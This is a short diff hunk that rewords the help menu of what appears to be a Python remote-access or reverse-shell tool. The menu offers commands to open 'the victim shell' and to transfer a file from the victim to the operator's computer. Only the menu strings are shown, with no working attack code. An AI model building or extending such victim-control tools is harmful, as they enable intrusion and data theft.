@@ -46,7 +46,7 @@ class Shell:
 
 
         if(SHELL_BT == verifications[3]):
-            print("\033[1;32mversion 0.1\n\nCommands:\n\nhelp			Print this message helper\nshell			Opens the victim shell\nrecv archive		Chose an archive of victim and recv to your computer\nexit		Exit the program\n\n\nUsage Method:\n\nrecv archive		recv archive <filename_client> <filename_server>\n\n\n\033[0;0m")
+            print("\033[1;32m\n\nCommands:\n\nhelp			Show this message helper\nshell			Opens the victim shell\nexit		Exit the shell\nrecv archive		Chose a file from the victim and tranfer it to your computer\n\n\nUsage:\n\nrecv archive		recv archive <filename_client> <filename_server>\n\n\n\033[0;0m")
 
     def home():
 
